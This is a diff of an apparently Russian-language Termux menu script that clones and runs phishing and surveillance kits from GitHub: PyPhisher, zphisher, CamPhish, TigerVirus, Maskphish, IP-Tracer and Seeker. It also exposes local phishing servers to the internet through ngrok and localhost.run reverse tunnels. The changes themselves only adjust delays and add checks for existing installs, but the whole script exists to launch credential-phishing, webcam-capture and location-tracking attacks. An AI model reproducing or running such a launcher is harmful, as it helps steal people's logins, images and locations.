@@ -85,21 +85,21 @@ while True:
                     time.sleep(7)
                     os.system('clear')
                     print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-                    time.sleep(2)
+                    time.sleep(1)
                     os.system('ngrok http '+we+' && clear')
                     os.system('clear')
                     
                 else:
                     os.system('clear')
                     print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-                    time.sleep(2)
+                    time.sleep(1)
                     os.system('ngrok http '+we_2+' && clear')
                     os.system('clear')
 
             if tru_102 == 'n':
                 os.system('clear')
                 print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-                time.sleep(2)
+                time.sleep(1)
                 os.system('clear')
                 os.system('ngrok http '+we+' && clear')
                 os.system('clear')
@@ -107,12 +107,13 @@ while True:
             else:
                 os.system('clear')
 
+
     
     if inp == '2':
         os.system('clear')
         print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Localhost...")
         res()
-        time.sleep(1.5)
+        time.sleep(1)
         os.system('clear')
         print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
         res()
@@ -142,21 +143,21 @@ while True:
                 time.sleep(7)
                 os.system('clear')
                 print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-                time.sleep(2)
+                time.sleep(1)
                 os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
                 os.system('clear')
                 
             else:
                 os.system('clear')
                 print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-                time.sleep(2)
+                time.sleep(1)
                 os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run && clear')
                 os.system('clear')
 
         if tru_202 == 'n':
             os.system('clear')
             print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-            time.sleep(2)
+            time.sleep(1)
             os.system('clear')
             os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
             os.system('clear')
@@ -167,32 +168,76 @@ while True:
     
 
     if inp == '3':
-        os.system('clear')
-        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка PyPhiser...")
-        res()
-        time.sleep(1.5)
-        os.system('git clone https://github.com/KasRoudra/PyPhisher')
-        os.chdir('PyPhisher')
-        os.system('clear')
-        os.system('python3 pyphisher.py')
-        tsu_302 = input('\n [Нажмите enter чтобы выйти]')
-        os.chdir('/data/data/com.termux/files/home/installer')
-        os.system('clear')
+        filename = "PyPhisher"
+
+        if os.path.exists(filename):
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] PyPhiser уже установлен!...")
+            time.sleep(2)
+            os.system('clear')
+            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
+            time.sleep(0.5)
+
+            os.chdir('PyPhisher')
+            os.system('clear')
+            os.system('python3 pyphisher.py')
+            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
+
+        else:
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] PyPhiser еще НЕ установлен!")
+            time.sleep(2)
+            
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка PyPhiser...")
+            res()
+            time.sleep(1.5)
+            os.system('git clone https://github.com/KasRoudra/PyPhisher')
+            os.chdir('PyPhisher')
+            os.system('clear')
+            os.system('python3 pyphisher.py')
+            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
 
     
 
     if inp == '4':
-        os.system('clear')
-        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Zphiser...")
-        res()
-        time.sleep(1.5)
-        os.system('git clone https://github.com/htr-tech/zphisher')
-        os.chdir('zphisher')
-        os.system('clear')
-        os.system('bash zphisher.sh')
-        tsu_401 = input('\n [Нажмите enter чтобы выйти]')
-        os.chdir('/data/data/com.termux/files/home/installer')
-        os.system('clear')
+        filename = "zphisher"
+
+        if os.path.exists(filename):
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Zphiser уже установлен!...")
+            time.sleep(2)
+            os.system('clear')
+            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
+            time.sleep(0.5)
+            
+            os.chdir('zphisher')
+            os.system('clear')
+            os.system('bash zphisher.sh')
+            tsu_401 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
+            
+        else:
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Zphiser еще НЕ установлен!")
+            time.sleep(2)
+        
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Zphiser...")
+            res()
+            time.sleep(1)
+            os.system('git clone https://github.com/htr-tech/zphisher')
+            os.chdir('zphisher')
+            os.system('clear')
+            os.system('bash zphisher.sh')
+            tsu_401 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
     
 
 
@@ -202,10 +247,10 @@ while True:
         if os.path.exists(filename):
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] CamPhish уже установлен!...")
-            time.sleep(2.5)
+            time.sleep(2)
             os.system('clear')
             print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-            time.sleep(1)
+            time.sleep(0.5)
 
             os.chdir('CamPhish')
             os.system('clear')
@@ -217,12 +262,11 @@ while True:
         else:
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] CamPhish еще НЕ установлен!")
-            time.sleep(2.5)
+            time.sleep(2)
         
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка CamPhish...")
             res()
-            time.sleep(1.5)
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php...")
             res()
@@ -250,13 +294,13 @@ while True:
         if os.path.exists(filename):
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] TigerVirus уже установлен!...")
-            time.sleep(2.5)
+            time.sleep(2)
             os.system('clear')
             print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-            time.sleep(1)
+            time.sleep(0.5)
             
-            os.system('clear')
             os.chdir('TigerVirus')
+            os.system('clear')
             os.system('bash TigerVirus.sh')
             tsu_601 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
@@ -265,7 +309,7 @@ while True:
         else:
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] TigerVirus еще НЕ установлен!")
-            time.sleep(2.5)
+            time.sleep(2)
 
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка TigerVirus...")
@@ -286,13 +330,13 @@ while True:
         if os.path.exists(filename):
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Maskphish уже установлен!...")
-            time.sleep(2.5)
+            time.sleep(2)
             os.system('clear')
             print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-            time.sleep(1)
+            time.sleep(0.5)
             
-            os.system('clear')
             os.chdir('maskphish')
+            os.system('clear')
             os.system('bash maskphish.sh')
             tsu_701 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
@@ -301,7 +345,7 @@ while True:
         else:
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Maskphish еще НЕ установлен!")
-            time.sleep(2.5)
+            time.sleep(2)
 
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Maskphish...")
@@ -318,9 +362,9 @@ while True:
     
     if inp == '8':
         os.system('clear')
-        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка IP-Tracer...")
+        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск IP-Tracer...")
         res()
-        time.sleep(1.5)
+        time.sleep(1)
         os.system('git clone https://github.com/rajkumardusad/IP-Tracer.git')
         os.chdir('IP-Tracer')
         os.system('bash install')
@@ -366,10 +410,10 @@ while True:
         if os.path.exists(filename):
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Seeker уже установлен!...")
-            time.sleep(2.5)
+            time.sleep(2)
             os.system('clear')
             print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
-            time.sleep(1)
+            time.sleep(0.5)
             
             os.chdir('seeker')
             os.system('clear')
@@ -381,12 +425,12 @@ while True:
         else:
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Seeker еще НЕ установлен!")
-            time.sleep(2.5)
+            time.sleep(2)
             
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
             res()
-            time.sleep(1.5)
+            time.sleep(1)
             os.system('clear')
             print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
             res()
